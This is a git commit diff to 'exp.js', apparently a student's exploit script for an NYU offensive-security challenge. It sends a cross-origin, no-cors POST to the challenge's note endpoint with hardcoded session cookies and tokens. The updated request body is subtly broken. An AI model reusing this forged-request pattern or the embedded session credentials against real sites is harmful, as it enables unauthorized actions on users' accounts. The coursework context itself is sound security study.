60ae2ab13b074cf22f3fe9846162066b60f56e30
David Brosnan <dbrosn626@gmail.com>
2023-01-29 12:07:51 -0500

    Update exp.js
    trying to make it json myself

--- exp.js
+++ exp.js
@@ -2,5 +2,5 @@ fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
 headers: {Cookie: "CHALBROKER_USER_ID=dmb9589; PHPSESSID=n9q6t2sofgli4bslcbha4ev6c5; session=.eJwtzrERwzAIAMBdqF0gJCHhZXyA4JzWjqtcdk-Tn-A_cOQV9wn7-3pig-O1YAdFHbHmUNeOK5WqNEaJrFQ0ZsEUFDaLGracwkr3FBZXVZkWo0xKRSq5InVZFOXO4dwoRxVvblTqyNorUjREG414Eis7demwwXPH9c-Yw_cHjzYw2g.Y9aiRQ.i0lT2QzfsX0w02pClwj0r3mjqV4"},
 method: 'POST',
 mode: 'no-cors',
-body:JSON.stringify("title=test456&content=note456&submit=save")
+body: {title:"test456", content:"note345", submit:"save"}
 });
